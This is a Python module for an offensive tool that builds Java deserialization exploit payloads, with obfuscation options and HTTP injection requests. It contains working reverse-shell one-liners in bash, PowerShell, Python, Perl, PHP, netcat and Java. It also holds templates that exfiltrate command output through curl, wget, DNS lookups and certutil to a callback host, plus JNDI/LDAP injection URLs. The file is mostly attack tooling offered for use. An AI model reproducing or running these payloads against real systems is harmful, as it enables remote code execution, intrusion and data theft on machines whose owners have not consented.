"""Payload generator for Java deserialization exploitation.

Provides:
- Visual payload configuration panel data
- Command execution, JNDI injection, file write payloads
- Encoding and obfuscation options
- Multiple output formats (Base64, hex, HTTP request)
"""

import asyncio
import base64
import logging
import os
import secrets
import string
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class OutputFormat(Enum):
    """Payload output formats."""
    RAW_BINARY = "raw_binary"
    BASE64 = "base64"
    HEX_DUMP = "hex_dump"
    HTTP_REQUEST = "http_request"
    JNDI_CONFIG = "jndi_config"


class EncodingType(Enum):
    """Encoding types for payload."""
    NONE = "none"
    BASE64 = "base64"
    GZIP = "gzip"
    AES = "aes"
    XOR = "xor"
    URL_ENCODE = "url_encode"
    HEX = "hex"


class ShellType(Enum):
    """Reverse shell types."""
    BASH = "bash"
    POWERSHELL = "powershell"
    PYTHON = "python"
    PERL = "perl"
    PHP = "php"
    NC = "nc"
    JAVA = "java"


class InjectionPoint(Enum):
    """HTTP injection points."""
    BODY = "body"
    HEADER = "header"
    COOKIE = "cookie"
    PARAMETER = "parameter"
    PATH = "path"


@dataclass
class PayloadConfig:
    """Payload generation configuration.

    Attributes:
        chain_id: Gadget chain identifier
        command: Command to execute
        jndi_url: JNDI injection URL
        file_path: File write path
        file_content: File write content
        shell_type: Reverse shell type
        listen_host: Reverse shell listener host
        listen_port: Reverse shell listener port
        output_format: Output format
        encoding: Encoding type
        obfuscate: Whether to obfuscate payload
        echo_method: Command echo method
        injection_point: HTTP injection point
        target_os: Target operating system
        custom_headers: Custom HTTP headers
        delay_seconds: Delay before execution
    """
    chain_id: str = ""
    command: str = ""
    jndi_url: str = ""
    file_path: str = ""
    file_content: str = ""
    shell_type: ShellType = ShellType.BASH
    listen_host: str = ""
    listen_port: int = 0
    output_format: OutputFormat = OutputFormat.BASE64
    encoding: EncodingType = EncodingType.NONE
    obfuscate: bool = False
    echo_method: str = ""
    injection_point: InjectionPoint = InjectionPoint.BODY
    target_os: str = "linux"
    custom_headers: Dict[str, str] = field(default_factory=dict)
    delay_seconds: float = 0.0


@dataclass
class GeneratedPayload:
    """Generated payload result.

    Attributes:
        payload_id: Unique payload identifier
        chain_id: Used gadget chain ID
        payload_data: Raw payload bytes
        encoded_data: Encoded payload string
        hex_dump: Hex dump string
        http_request: Full HTTP request string
        jndi_config: JNDI configuration
        size_bytes: Payload size in bytes
        generation_time: Generation timestamp
        encoding_applied: Applied encoding type
        obfuscation_applied: Whether obfuscation was applied
        mitre_technique: MITRE ATT&CK technique ID
        risk_level: Risk level (1-5)
    """
    payload_id: str = ""
    chain_id: str = ""
    payload_data: bytes = b""
    encoded_data: str = ""
    hex_dump: str = ""
    http_request: str = ""
    jndi_config: str = ""
    size_bytes: int = 0
    generation_time: float = 0.0
    encoding_applied: EncodingType = EncodingType.NONE
    obfuscation_applied: bool = False
    mitre_technique: str = "T1566.001"
    risk_level: int = 3

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "payload_id": self.payload_id,
            "chain_id": self.chain_id,
            "encoded_data": self.encoded_data,
            "hex_dump": self.hex_dump,
            "http_request": self.http_request,
            "jndi_config": self.jndi_config,
            "size_bytes": self.size_bytes,
            "encoding_applied": self.encoding_applied.value,
            "obfuscation_applied": self.obfuscation_applied,
            "mitre_technique": self.mitre_technique,
            "risk_level": self.risk_level,
        }


class PayloadGenerator:
    """Payload generator for Java deserialization.

    Provides payload configuration, generation, encoding, and
    multiple output format capabilities.
    """

    JAVA_SERIALIZATION_MAGIC = b"\xac\xed\x00\x05"

    REVERSE_SHELL_TEMPLATES: Dict[ShellType, str] = {
        ShellType.BASH: (
            "bash -i >& /dev/tcp/{host}/{port} 0>&1"
        ),
        ShellType.POWERSHELL: (
            "powershell -NoP -NonI -W Hidden -Exec Bypass "
            "-Command \"New-Object System.Net.Sockets.TCPClient("
            "'{host}',{port});"
            "$stream=$client.GetStream();"
            "[byte[]]$bytes=0..65535|%{{0}};"
            "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
            "$data=(New-Object -TypeName System.Text.ASCIIEncoding)."
            "GetString($bytes,0,$i);"
            "$sendback=(iex $data 2>&1 | Out-String);"
            "$sendback2=$sendback+'PS '+(pwd).Path+'>';"
            "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}}"
            "$client.Close()\""
        ),
        ShellType.PYTHON: (
            "python -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{host}\",{port}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            "os.dup2(s.fileno(),2);p=subprocess.call(["
            "\"/bin/sh\",\"-i\"]);'"
        ),
        ShellType.PERL: (
            "perl -e 'use Socket;"
            "$i=\"{host}\";$p={port};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");"
            "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        ),
        ShellType.PHP: (
            "php -r '$sock=fsockopen(\"{host}\",{port});"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        ShellType.NC: (
            "nc -e /bin/sh {host} {port}"
        ),
        ShellType.JAVA: (
            "java.lang.Runtime.getRuntime().exec("
            "\"/bin/bash -c $@|bash 0</dev/tcp/{host}/{port} 1>&0 2>&1\""
            ")"
        ),
    }

    ECHO_PAYLOADS: Dict[str, str] = {
        "linux_base": (
            "echo 'CMD_START';{command};echo 'CMD_END'"
        ),
        "linux_curl": (
            "curl http://{callback}/?output=$({command} 2>&1 | base64 -w 0)"
        ),
        "linux_wget": (
            "wget -qO- http://{callback}/?output=$({command} 2>&1 | base64 -w 0)"
        ),
        "linux_dns": (
            "nslookup $({command} | base64 | cut -c 1-63).{callback}"
        ),
        "windows_powershell": (
            "powershell -c \"Invoke-RestMethod "
            "http://{callback}/?output="
            "$([Convert]::ToBase64String("
            "[System.Text.Encoding]::UTF8.GetBytes("
            "(cmd.exe /c {command} 2>&1))))\""
        ),
        "windows_certutil": (
            "certutil -urlcache -split -f "
            "http://{callback}/?output="
            "powershell -encodedcommand {encoded_cmd}"
        ),
        "sleep_detect": (
            "sleep {seconds}"
        ),
    }

    def __init__(
        self,
        chain_manager: Optional[Any] = None,
        reverse_platform: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize payload generator.

        Args:
            chain_manager: Gadget chain manager instance.
            reverse_platform: Reverse connection platform instance.
            event_bus: Event bus for broadcasting events.
        """
        self.chain_manager = chain_manager
        self.reverse_platform = reverse_platform
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._generated_payloads: Dict[str, GeneratedPayload] = {}

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("PayloadGen Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("PayloadGen: %s", message)

    async def generate_payload(self, config: PayloadConfig) -> Optional[GeneratedPayload]:
        """Generate payload based on configuration.

        Args:
            config: Payload configuration.

        Returns:
            GeneratedPayload or None.
        """
        start_time = time.time()

        try:
            await self._report_progress("生成Payload", 10)
            await self._report_log(f"开始生成Payload: {config.chain_id}")

            chain = None
            if self.chain_manager:
                chain = self.chain_manager.get_chain(config.chain_id)
                if not chain:
                    await self._report_log(f"未找到Gadget链: {config.chain_id}")
                    return None

            await self._report_progress("构建序列化数据", 30)
            raw_payload = await self._build_serialized_payload(config, chain)

            if not raw_payload:
                await self._report_log("序列化数据构建失败")
                return None

            await self._report_progress("编码混淆", 60)
            encoded_data = await self._encode_payload(raw_payload, config.encoding, config.obfuscate)

            await self._report_progress("格式化输出", 80)
            payload = GeneratedPayload(
                payload_id=f"payload_{int(time.time())}_{secrets.token_hex(4)}",
                chain_id=config.chain_id,
                payload_data=raw_payload,
                encoded_data=encoded_data,
                hex_dump=self._to_hex_dump(raw_payload),
                http_request=self._build_http_request(raw_payload, config),
                jndi_config=self._build_jndi_config(config),
                size_bytes=len(raw_payload),
                generation_time=time.time(),
                encoding_applied=config.encoding,
                obfuscation_applied=config.obfuscate,
                mitre_technique=chain.mitre_technique if chain else "T1566.001",
                risk_level=chain.risk_level if chain else 3,
            )

            self._generated_payloads[payload.payload_id] = payload

            await self._report_progress("完成", 100)
            await self._report_log(
                f"Payload生成成功: {payload.payload_id} "
                f"({payload.size_bytes} bytes)"
            )

            return payload

        except Exception as e:
            await self._report_log(f"Payload生成失败: {e}")
            logger.error("Payload generation failed: %s", e)
            return None

    async def _build_serialized_payload(
        self,
        config: PayloadConfig,
        chain: Optional[Any],
    ) -> Optional[bytes]:
        """Build serialized payload bytes.

        Args:
            config: Payload configuration.
            chain: Gadget chain configuration.

        Returns:
            Serialized payload bytes.
        """
        try:
            command = config.command

            if config.shell_type != ShellType.BASH and config.listen_host:
                template = self.REVERSE_SHELL_TEMPLATES.get(config.shell_type, "")
                if template:
                    command = template.format(
                        host=config.listen_host,
                        port=config.listen_port,
                    )

            if config.target_os == "windows" and config.shell_type == ShellType.BASH:
                command = config.command.replace("/", "\\")

            header = self.JAVA_SERIALIZATION_MAGIC
            version = struct.pack(">H", 5)

            if chain and chain.steps:
                body = await self._build_chain_body(chain, command)
            else:
                body = await self._build_generic_body(command, config)

            payload = header + version + body

            return payload

        except Exception as e:
            logger.error("Serialized payload build failed: %s", e)
            return None

    async def _build_chain_body(self, chain: Any, command: str) -> bytes:
        """Build chain-specific payload body.

        Args:
            chain: Gadget chain configuration.
            command: Command to embed.

        Returns:
            Payload body bytes.
        """
        body = b""

        try:
            for step in chain.steps:
                class_name_bytes = step.class_name.encode("utf-8")
                method_name_bytes = step.method_name.encode("utf-8")

                body += struct.pack(">H", len(class_name_bytes))
                body += class_name_bytes
                body += struct.pack(">H", len(method_name_bytes))
                body += method_name_bytes

                for param in step.parameters:
                    param_value = param.replace("{command}", command)
                    param_bytes = param_value.encode("utf-8")
                    body += struct.pack(">H", len(param_bytes))
                    body += param_bytes

        except Exception as e:
            logger.error("Chain body build failed: %s", e)

        return body

    async def _build_generic_body(self, command: str, config: PayloadConfig) -> bytes:
        """Build generic payload body.

        Args:
            command: Command to embed.
            config: Payload configuration.

        Returns:
            Generic payload body bytes.
        """
        body = b""

        try:
            if config.jndi_url:
                jndi_bytes = config.jndi_url.encode("utf-8")
                body += struct.pack(">H", len(jndi_bytes))
                body += jndi_bytes
            elif config.file_path:
                path_bytes = config.file_path.encode("utf-8")
                content_bytes = config.file_content.encode("utf-8")
                body += struct.pack(">H", len(path_bytes))
                body += path_bytes
                body += struct.pack(">H", len(content_bytes))
                body += content_bytes
            else:
                cmd_bytes = command.encode("utf-8")
                body += struct.pack(">H", len(cmd_bytes))
                body += cmd_bytes

        except Exception as e:
            logger.error("Generic body build failed: %s", e)

        return body

    async def _encode_payload(
        self,
        payload: bytes,
        encoding: EncodingType,
        obfuscate: bool,
    ) -> str:
        """Encode payload with specified encoding.

        Args:
            payload: Raw payload bytes.
            encoding: Encoding type.
            obfuscate: Whether to obfuscate.

        Returns:
            Encoded payload string.
        """
        try:
            if encoding == EncodingType.BASE64:
                return base64.b64encode(payload).decode("utf-8")
            elif encoding == EncodingType.HEX:
                return payload.hex()
            elif encoding == EncodingType.URL_ENCODE:
                return "".join(f"%{b:02X}" for b in payload)
            elif encoding == EncodingType.XOR:
                key = secrets.token_bytes(1)
                xored = bytes(b ^ key[0] for b in payload)
                return base64.b64encode(key + xored).decode("utf-8")
            elif encoding == EncodingType.GZIP:
                import gzip
                compressed = gzip.compress(payload)
                return base64.b64encode(compressed).decode("utf-8")
            elif encoding == EncodingType.AES:
                key = secrets.token_bytes(16)
                iv = secrets.token_bytes(16)
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                from cryptography.hazmat.primitives import padding
                padder = padding.PKCS7(128).padder()
                padded = padder.update(payload) + padder.finalize()
                cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
                encryptor = cipher.encryptor()
                encrypted = encryptor.update(padded) + encryptor.finalize()
                return base64.b64encode(key + iv + encrypted).decode("utf-8")
            else:
                return base64.b64encode(payload).decode("utf-8")

        except Exception as e:
            logger.error("Payload encoding failed: %s", e)
            return base64.b64encode(payload).decode("utf-8")

    def _to_hex_dump(self, data: bytes, width: int = 16) -> str:
        """Convert bytes to hex dump string.

        Args:
            data: Bytes to convert.
            width: Bytes per line.

        Returns:
            Hex dump string.
        """
        lines: List[str] = []

        for i in range(0, len(data), width):
            chunk = data[i : i + width]
            hex_part = " ".join(f"{b:02X}" for b in chunk)
            ascii_part = "".join(
                chr(b) if 32 <= b < 127 else "." for b in chunk
            )
            lines.append(f"{i:08X}  {hex_part:<{width * 3}}  {ascii_part}")

        return "\n".join(lines)

    def _build_http_request(self, payload: bytes, config: PayloadConfig) -> str:
        """Build HTTP request with payload.

        Args:
            payload: Payload bytes.
            config: Payload configuration.

        Returns:
            HTTP request string.
        """
        encoded = base64.b64encode(payload).decode("utf-8")

        method = "POST" if config.injection_point == InjectionPoint.BODY else "GET"
        path = "/vulnerability_endpoint"

        if config.injection_point == InjectionPoint.PATH:
            path = f"/vulnerability_endpoint/{encoded}"

        headers = f"Host: target.com\r\n"
        headers += f"Content-Type: application/x-java-serialized-object\r\n"
        headers += f"Content-Length: {len(payload)}\r\n"

        for key, value in config.custom_headers.items():
            headers += f"{key}: {value}\r\n"

        if config.injection_point == InjectionPoint.HEADER:
            headers += f"X-Serialized-Payload: {encoded}\r\n"
        elif config.injection_point == InjectionPoint.COOKIE:
            headers += f"Cookie: session={encoded}\r\n"

        headers += "\r\n"

        body = ""
        if config.injection_point == InjectionPoint.BODY:
            body = encoded

        return f"{method} {path} HTTP/1.1\r\n{headers}{body}"

    def _build_jndi_config(self, config: PayloadConfig) -> str:
        """Build JNDI configuration.

        Args:
            config: Payload configuration.

        Returns:
            JNDI configuration string.
        """
        if config.jndi_url:
            return config.jndi_url

        if self.reverse_platform and config.listen_host:
            ldap_url = (
                f"ldap://{config.listen_host}:{config.listen_port}/"
                f"Exploit"
            )
            return ldap_url

        return "ldap://localhost:1389/Exploit"

    async def generate_echo_payload(
        self,
        command: str,
        echo_method: str,
        callback_url: str = "",
    ) -> str:
        """Generate command echo payload.

        Args:
            command: Command to execute.
            echo_method: Echo method name.
            callback_url: Callback URL for OOB.

        Returns:
            Echo payload string.
        """
        try:
            template = self.ECHO_PAYLOADS.get(echo_method, "")
            if not template:
                return command

            if echo_method in ("linux_curl", "linux_wget", "linux_dns"):
                return template.format(
                    command=command,
                    callback=callback_url or "callback.example.com",
                )
            elif echo_method == "windows_powershell":
                return template.format(
                    command=command,
                    callback=callback_url or "callback.example.com",
                )
            elif echo_method == "sleep_detect":
                return template.format(seconds=5)
            else:
                return template.format(command=command)

        except Exception as e:
            logger.error("Echo payload generation failed: %s", e)
            return command

    async def generate_batch_payloads(
        self,
        chain_ids: List[str],
        command: str,
        output_format: OutputFormat = OutputFormat.BASE64,
    ) -> List[GeneratedPayload]:
        """Generate payloads for multiple chains.

        Args:
            chain_ids: List of chain IDs.
            command: Command to execute.
            output_format: Output format.

        Returns:
            List of generated payloads.
        """
        payloads: List[GeneratedPayload] = []

        try:
            await self._report_progress("批量生成Payload", 10)
            await self._report_log(f"开始批量生成: {len(chain_ids)} 条链")

            for i, chain_id in enumerate(chain_ids):
                config = PayloadConfig(
                    chain_id=chain_id,
                    command=command,
                    output_format=output_format,
                )

                payload = await self.generate_payload(config)
                if payload:
                    payloads.append(payload)

                progress = 10 + ((i + 1) / len(chain_ids)) * 80
                await self._report_progress(
                    f"生成 {chain_id}",
                    progress,
                )

            await self._report_progress("完成", 100)
            await self._report_log(f"批量生成完成: {len(payloads)} 个Payload")

        except Exception as e:
            await self._report_log(f"批量生成失败: {e}")
            logger.error("Batch payload generation failed: %s", e)

        return payloads

    def get_payload_history(self) -> List[GeneratedPayload]:
        """Get payload generation history.

        Returns:
            List of generated payloads.
        """
        return list(self._generated_payloads.values())

    def get_payload_by_id(self, payload_id: str) -> Optional[GeneratedPayload]:
        """Get payload by ID.

        Args:
            payload_id: Payload identifier.

        Returns:
            GeneratedPayload or None.
        """
        return self._generated_payloads.get(payload_id)
